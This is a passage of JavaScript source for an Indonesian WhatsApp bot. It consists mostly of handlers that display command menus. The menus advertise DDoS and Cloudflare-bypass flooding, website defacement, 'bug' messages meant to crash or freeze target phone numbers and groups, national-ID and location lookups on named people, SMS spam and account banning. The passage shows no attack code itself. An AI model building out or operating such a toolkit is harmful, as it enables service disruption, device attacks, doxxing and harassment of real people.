║➢ d37 caca-store.biz.id
║➢ d38 rhizhosting.my.id
║➢ d39 spasanddella.my.id
║➢ d40 zerowant.my.id
║➢ d41 sellerpanel-vvip.my.id
║➢ d42 ekiofficial.my.id
║➢ d43 ekioffcial.biz.id
║➢ d44 nw-terbaru-whs.biz.id
║➢ d45 panelku-jasteb.my.id
║➢ d46 tokodigitalonline.my.id
║➢ d47 pannel-pvrt.my.id
║➢ d48 sellerpanell.my.id
║➢ d49 pannelkuu.biz.id
║➢ d50 miha.my.id
║➢ d51 server-smtp1.my.id
║➢ d52 my-website.my.id
║➢ d53 smtp1.my.id
║➢ d54 panellkuu.cloud
║➢ d55 dzhostingid.com
║➢ d56 didindev.my.id
║➢ d57 panelstore.xyz
║➢ d58 yasshost.com
║➢ d59 diimz.site
║➢ d60 didinsec.biz.id
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await domen()
        await reaction(from, "☠️")
      }
        break


      case "/topupmenu": {
        async function menu() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢ topup-game *game*
║*contoh : topup-game free-fire*
║
║➢ topup-saldo *payment*
║*contoh : topup-saldo dana*
║
║➢ suntik *sosmed*
║*contoh : suntik instagram*
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await menu()
        await reaction(from, "☠️")
      }
        break


      case "/lacakresimenu": {
        async function menu() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢  ${prefix}lacak-resi-jne *resi*
║➢ lacak-resi-jnt *resi*
║➢ lacak-resi-wahana *resi*
║➢ lacak-resi-pos *resi*
║➢ lacak-resi-sicepat *resi*
║➢ lacak-resi-anteraja *resi*
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await menu()
        await reaction(from, "☠️")
      }
        break
      case '/anonimmenu': {
        async function menu() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢ ddosfitur
║➢ defacefitur
║➢ lacakfitur
┗━━━━━━━━━━━━━━━━━━⬣
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await menu()
        await reaction(from, "☠️")
      }
        break

      case "/ddosfitur": {
        async function menu() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢ ddos *website duration*
║➢ d-fetch *url time*
║➢ egao *url time rps thread*
║➢ mix *url time rps thread*
║➢ floods *url time rps thread*
║➢  ${prefix}kilua *url time rps thread*
║➢ xchrome *url time rps thread*
║➢ tls *url time rps thread*
║➢ tls-v2 *url time rps thread*
║➢ tls-bypass *url time rps thread*
║➢ bypass-cf *url time rps thread*
║➢ tls-vip *url time rps thread*
║➢ tcp *url time rps thread*
║➢ livex *url time rps thread*
║➢ xweb *url time rps thread*
║                  ###
║➢ fetch *url time rps thread*
║➢ checkhost *url*
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await menu()
        await reaction(from, "☠️")
      }
        break

      case "/defacefitur": {
        async function menu() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢ deface *namamu*
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await menu()
        await reaction(from, "☠️")
      }
        break


      case "/lacakfitur": {
        async function menu() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `📁𝘕𝘖𝘛𝘌 : 𝘍𝘪𝘵𝘶𝘳 "𝘨𝘦𝘵𝘯𝘪𝘬&𝘭𝘢𝘤𝘢𝘬𝘭𝘰𝘬𝘢𝘴𝘪" 𝘩𝘢𝘯𝘺𝘢 𝘶𝘯𝘵𝘶𝘬 𝘧𝘶𝘯 𝘺𝘢 𝘤𝘶𝘺 , 𝘨𝘢 𝘢𝘬𝘶𝘳𝘢𝘵, 𝘴𝘰𝘢𝘭𝘯𝘺𝘢 𝘣𝘶𝘢𝘵 𝘧𝘶𝘯 𝘥𝘰𝘢𝘯𝘨
╔─═─═─═─═─═─═─⬣
║➢ nikparse *nik*
║➢ getnik *nama*
║➢ lacaklokasi *nama* 
║➢ iplookup *ip*
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await menu()
        await reaction(from, "☠️")
      }
        break
      // BUG MENU
      case "/bugmenu": {
        async function menu() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢ qio-bugmenu
║➢ murbug-bugmenu
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await menu()
        await reaction(from, "☠️")
      }
        break


      case "/murbug-bugmenu": {
        async function menu() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `NOTE : *BUG KHUSUS MURBUG*
*KHUSUS GRUP , GAK BISA DI LUAR GRUP*
╔─═─═─═─═─═─═─⬣
║➢ mb-bug *628###*
║➢ mb-kill  *628###*
║➢ mb-spy  *628###*
║➢ mb-🧸  *628###*
║➢ mb-😍  *628###*
║➢ mb-🥵  *628###*
║➢ mb-freeze  *628###*
║➢ mb-blacksc  *628###*
║➢ mb-bugwaktu  *628###|60*
║➢ mb-bugjumlah  *628###|10*
║           #!#
║➢ mb-iphone  *628###*
║           #!#
║➢ mb-gckill  *linkgc*
║➢ mb-gcbug  *linkgc*
║➢ mb-gcspy  *linkgc*
║➢ mb-bugallmem
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await menu()
        await reaction(from, "☠️")
      }
        break

      case "/qio-bugmenu": {
        async function menu() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢ qio-🧸  *628###*
║➢ qio-😍  *628###*
║➢ qio-🥵  *628###*
║➢ qio-force *628###*
║➢ qio-conquer  *628###*
║➢ qio-eterno  *628###*
║➢ qio-kill  *628###*
║➢ qio-notif  *628###*
║➢ qio-stuck  *628###*
║➢ qio-blacksc  *628###*
║➢ qio-freeze  *628###*
║➢ qio-bugwaktu  *628###|60*
║➢ qio-bugjumlah  *628###|10*
║           #!#
║➢ qio-iphone  *628###*
║           #!#
║➢ qio-gckill  *linkgc*
║➢ qio-gcbug  *linkgc*
║➢ qio-gcspy  *linkgc*
║➢ qio-bugallmem
║           #!#
║➢ xixi *(kirim lewat pc)*
║➢ bugvid1
║➢ bugvid2
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await menu()
        await reaction(from, "☠️")
      }
        break

      case "/bugviabutton": {
        async function menu() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢ sendbugnum
║➢ sendbugnum2
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await menu()
        await reaction(from, "☠️")
      }
        break

      // TXT MENU
      case '/txtmenu':
        async function menu() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢ txtban1
║➢ txtban2
║➢ txtban3
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await menu()
        await reaction(from, "☠️")
        break
      // AKSES MENU
      case '/aksesmenu':
        async function qioooww() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢ addowner *628###*
║➢ delowner *628###*
║➢ addprem *628###*
║➢ delprem *628###*
║➢ aksesmurbug *6288xxx/tag*
║➢ delaksesmurbug *6288xxx/tag*
║➢ addseller *628###*
║➢ delseller *628###*
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await qioooww()
        await reaction(from, "☠️")
        break

      case "/gamemenu":
        async function qiooww() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢ cekkhodamcore *nama*
║➢ cekkhodam *nama*
║➢ cekjodoh *nama*
║➢ cekkuota *nama*
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await qiooww()
        await reaction(from, "☠️")
        break
      // SOUND MENU
      case '/soundmenu':
        async function qioww() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢ sound1
║➢ sound2
║➢ sound3
║➢ sound4
║➢ sound5
║➢ sound6
║➢ sound7
║➢ sound8
║➢ sound9
║➢ sound10
║➢ sound11
║➢ sound12
║➢ sound13
║➢ sound14
║➢ sound15
║➢ sound16
║➢ sound17
║➢ sound18
║➢ sound18
║➢ sound20
║➢ sound21
║➢ sound22
║➢ sound23
║➢ sound24
║➢ sound25
║➢ sound26
║➢ sound27
║➢ sound28
║➢ sound29
║➢ sound30
║➢ sound31
║➢ sound32
║➢ sound33
║➢ sound34
║➢ sound35
║➢ sound36
║➢ sound37
║➢ sound38
║➢ sound39
║➢ sound40
║➢ sound41
║➢ sound42
║➢ sound43
║➢ sound44
║➢ sound45
║➢ sound46
║➢ sound47
║➢ sound48
║➢ sound49
║➢ sound50
║➢ sound51
║➢ sound52
║➢ sound53
║➢ sound54
║➢ sound55
║➢ sound56
║➢ sound57
║➢ sound58
║➢ sound59
║➢ sound60
║➢ sound61
║➢ sound62
║➢ sound63
║➢ sound64
║➢ sound65
║➢ sound66
║➢ sound67
║➢ sound68
║➢ sound69
║➢ sound70
║➢ sound71
║➢ sound72
║➢ sound73
║➢ sound74
║➢ sound75
║➢ sound76
║➢ sound77
║➢ sound78
║➢ sound79
║➢ sound80
║➢ sound81
║➢ sound82
║➢ sound83
║➢ sound84
║➢ sound85
║➢ sound86
║➢ sound87
║➢ sound88
║➢ sound89
║➢ sound90
║➢ sound91
║➢ sound92
║➢ sound93
║➢ sound94
║➢ sound95
║➢ sound96
║➢ sound97
║➢ sound98
║➢ sound99
║➢ sound100
║➢ sound101
║➢ sound102
║➢ sound103
║➢ sound104
║➢ sound105
║➢ sound106
║➢ sound107
║➢ sound108
║➢ sound109
║➢ sound110
║➢ sound111
║➢ sound112
║➢ sound113
║➢ sound114
║➢ sound115
║➢ sound116
║➢ sound117
║➢ sound118
║➢ sound119
║➢ sound120
║➢ sound121
║➢ sound122
║➢ sound123
║➢ sound124
║➢ sound125
║➢ sound126
║➢ sound127
║➢ sound128
║➢ sound129
║➢ sound130
║➢ sound131
║➢ sound132
║➢ sound133
║➢ sound134
║➢ sound135
║➢ sound136
║➢ sound137
║➢ sound138
║➢ sound139
║➢ sound140
║➢ sound141
║➢ sound142
║➢ sound143
║➢ sound144
║➢ sound145
║➢ sound146
║➢ sound147
║➢ sound148
║➢ sound149
║➢ sound150
║➢ sound151
║➢ sound152
║➢ sound153
║➢ sound154
║➢ sound155
║➢ sound156
║➢ sound157
║➢ sound158
║➢ sound159
║➢ sound160
║➢ sound161
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await qioww()
        await reaction(from, "☠️")
        break
      // GROUP MENU
      case '/groupmenu':
        async function qiooow() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢ pushkontak *text*
║➢ bcgroup *text*
║➢ hidetag *text*
║➢ editsubjek *text*
║➢ editdesk *text*
║➢ inspect *link gc*
║➢ add *628###*
║➢ kick *628###*
║➢ promote *628###*
║➢ demote *628###*
║➢ linkgroup
║➢ resetlinkgc
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await qiooow()
        await reaction(from, "☠️")
        break
      // qio MENU
      case '/ownermenu':
        async function qioow() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢ threads
║➢ ipbot
║➢ myip
║➢ deleteip
║➢ listip
║➢ subfinder
║➢ tempban *62xx*
║➢ bannedno *62xx*
║➢ bannum *62xx*
║➢ resetotp *62xx*
║➢ unbanned *62xx*
║➢ unbannedv2 *62xx*
║➢ unbannedv3 *62xx*
║➢ spamsms *62xx*
║➢ nowa *62xx*
║➢ enc *kode*
║➢ decrypt *kode*
║➢ autoread
║➢ restart
║➢ shutdown
║➢ getsession
║➢ delsession
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await qioow()
        await reaction(from, "☠️")
        break
      // STICKER MENU
      case '/stickermenu':
        async function qiow() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢ attp *text*
║➢ sticker
║➢ smeme
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await qiow()
        await reaction(from, "☠️")
        break
      // DOWNLOAD MENU
      case '/downloadmenu':
        async function qow() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢ tiktokmp4 *link*
║➢ tiktokmp3 *link*
║➢ ytmp3 *link*
║➢ ytmp4 *link*
║➢ igmp3 *link*
║➢ igmp4 *link*
║➢ startytmp3 *judul*
║➢ yts *judul*
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await qow()
        await reaction(from, "☠️")
        break
      // TOOLS MENU
      case '/toolsmenu':
        async function qiooowpw() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢ style *teks*
║➢ fliptext *teks*
║➢ tourl *m.reply media*
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await qiooowpw()
        await reaction(from, "☠️")
        break
      // ASUPAN MENU
      case '/asupanmenu':
        async function qioooow() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢ tiktokgirl 
║➢ tiktoknukthy 
║➢ tiktokkayes
║➢ tiktokpanrika
║➢ tiktoknotnot
║➢ tiktokghea
║➢ tiktoksantuy
║➢ paptt
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await qioooow()
        await reaction(from, "☠️")
        break
      // CASE LAINNYA

      case "/addowner":
        if (!isDeveloper) return
